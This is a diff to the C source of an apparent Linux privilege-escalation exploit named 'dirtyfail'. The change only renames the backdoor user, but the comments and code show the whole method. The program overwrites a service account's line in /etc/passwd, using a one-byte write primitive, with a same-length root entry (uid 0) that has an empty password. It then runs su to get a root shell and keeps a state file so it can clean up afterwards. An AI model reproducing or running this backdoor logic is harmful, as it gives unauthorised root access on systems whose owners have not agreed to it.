@@ -8,11 +8,11 @@
  *
  *   install:
  *     1. parse /etc/passwd, find longest line with nologin/false/sync shell
- *     2. compute replacement "sick::0:0:<pad>:/:/bin/bash" same length
+ *     2. compute replacement "dirtyfail::0:0:<pad>:/:/bin/bash" same length
  *     3. snapshot state to /var/tmp/.dirtyfail.state
  *     4. for each byte that differs:
  *          cfg_1byte_write(/etc/passwd, byte_off, new_byte)
- *     5. exec su - sick     (PAM nullok accepts empty password)
+ *     5. exec su - dirtyfail     (PAM nullok accepts empty password)
  *
  *   cleanup:
  *     1. read state (LINE_OFF, original VICTIM_LINE)
@@ -30,9 +30,9 @@
 #include <sys/stat.h>
 
 #define STATE_FILE   "/var/tmp/.dirtyfail.state"
-#define NEW_USER     "sick"
-#define SICK_PREFIX  "sick::0:0:"
-#define SICK_SUFFIX  ":/:/bin/bash"
+#define NEW_USER     "dirtyfail"
+#define DF_PREFIX    "dirtyfail::0:0:"
+#define DF_SUFFIX    ":/:/bin/bash"
 
 /* ---- /etc/passwd line picker ---------------------------------------- *
  *
@@ -210,18 +210,18 @@ df_result_t backdoor_install(bool do_shell)
              v.name, (long long)v.line_off, v.line_len);
 
     /* Build replacement, same length. */
-    size_t fixed_len = strlen(SICK_PREFIX) + strlen(SICK_SUFFIX);
+    size_t fixed_len = strlen(DF_PREFIX) + strlen(DF_SUFFIX);
     if (v.line_len < fixed_len) {
-        log_bad("victim line too short (%zu) for sick replacement (need >= %zu)",
+        log_bad("victim line too short (%zu) for dirtyfail replacement (need >= %zu)",
                 v.line_len, fixed_len);
         return DF_TEST_ERROR;
     }
     size_t pad_len = v.line_len - fixed_len;
     char target[256];
     char *p = target;
-    memcpy(p, SICK_PREFIX, strlen(SICK_PREFIX)); p += strlen(SICK_PREFIX);
+    memcpy(p, DF_PREFIX, strlen(DF_PREFIX)); p += strlen(DF_PREFIX);
     memset(p, 'X', pad_len); p += pad_len;
-    memcpy(p, SICK_SUFFIX, strlen(SICK_SUFFIX)); p += strlen(SICK_SUFFIX);
+    memcpy(p, DF_SUFFIX, strlen(DF_SUFFIX)); p += strlen(DF_SUFFIX);
     *p = '\0';
 
     log_step("replacement:  '%s'", target);
